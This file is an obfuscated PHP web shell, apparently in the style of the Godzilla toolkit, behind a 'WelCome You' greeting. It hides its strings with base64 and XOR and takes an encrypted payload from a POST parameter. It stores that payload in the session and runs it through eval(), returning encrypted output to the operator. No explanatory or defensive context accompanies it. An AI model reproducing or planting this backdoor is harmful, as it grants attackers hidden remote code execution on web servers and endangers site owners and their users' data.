WelCome You
<?pHP
@session_start();
@set_time_limit(Chr("48"));
@error_reporting/*xlpassFxPZTQCW*/(Chr("48"));
function xlpassOAYjrNyf(/*xlpassHtpFwSlN*/$xlpassUtlhDpIr,$xlpasspZZCLKTY){
    for($xlpassHoUwRnQp=Chr("48");$xlpassHoUwRnQp<strlen($xlpassUtlhDpIr);$xlpassHoUwRnQp++) {
        $xlpassJRezLkrV = $xlpasspZZCLKTY[$xlpassHoUwRnQp+Chr("49")&15];
        $xlpassUtlhDpIr[$xlpassHoUwRnQp] = $xlpassUtlhDpIr[$xlpassHoUwRnQp]^$xlpassJRezLkrV;
    }
    return $xlpassUtlhDpIr;
}
$xlpassrcaNbbeO = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
$base64_xlpassOAYjrNyf = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
$xlpasseymoUqVp=(" "^"X").(" "^"L").(" "^"A").(" "^"Q").$xlpassrcaNbbeO($xlpassrcaNbbeO("TURrd09BPT0="));
$xlpassIfEypezd='p'.$xlpassrcaNbbeO($xlpassrcaNbbeO("WVhsc2IyRms="));
$xlpassGEOsNPcp='162001d3'.$xlpassrcaNbbeO("NDUzMGI2ZTc=");
if (isset($_POST/*xlpassnVDFEWIC*/[$xlpasseymoUqVp])){
    $datxlpasskSAYjLyw=xlpassOAYjrNyf/*xlpassgxHhJWZF*/($xlpassrcaNbbeO($_POST[$xlpasseymoUqVp]),$xlpassGEOsNPcp);
    if (/*xlpassWHYSGOHB*/isset($_SESSION/*xlpassKOxwunux*/[$xlpassIfEypezd])){
        $xlpassjwiqTlPt=xlpassOAYjrNyf($_SESSION/*xlpassOZQvSZnb*/[$xlpassIfEypezd],$xlpassGEOsNPcp);
        if (/*xlpassPyxzAaZi*/strpos($xlpassjwiqTlPt,$xlpassrcaNbbeO/*xlpassBkNWVKHH*/($xlpassrcaNbbeO("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
            $xlpassjwiqTlPt=xlpassOAYjrNyf/*xlpassNiOfrmut*/($xlpassjwiqTlPt,$xlpassGEOsNPcp);
        }
		define("xlpasshBokkjwr","//xlpassKKPSHZeT\r\n".$xlpassjwiqTlPt);
		 eval("/*xlpass-DP@i*/".xlpasshBokkjwr."");
        echo substr(/*xlpassWizXKqir*/md5/*xlpassbxzxPjvC*/($xlpasseymoUqVp.$xlpassGEOsNPcp),Chr("48"),16);
        echo $base64_xlpassOAYjrNyf(xlpassOAYjrNyf(@run($datxlpasskSAYjLyw),$xlpassGEOsNPcp));
        echo substr(/*xlpassoBnQcnHC*/md5/*xlpassdFwycfDR*/($xlpasseymoUqVp.$xlpassGEOsNPcp),16);
    }else{
        if (strpos/*xlpassgRzlfJOI*/($datxlpasskSAYjLyw,$xlpassrcaNbbeO($xlpassrcaNbbeO("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
            $_SESSION[$xlpassIfEypezd]=xlpassOAYjrNyf($datxlpasskSAYjLyw,$xlpassGEOsNPcp);
        }
    }
}
?>
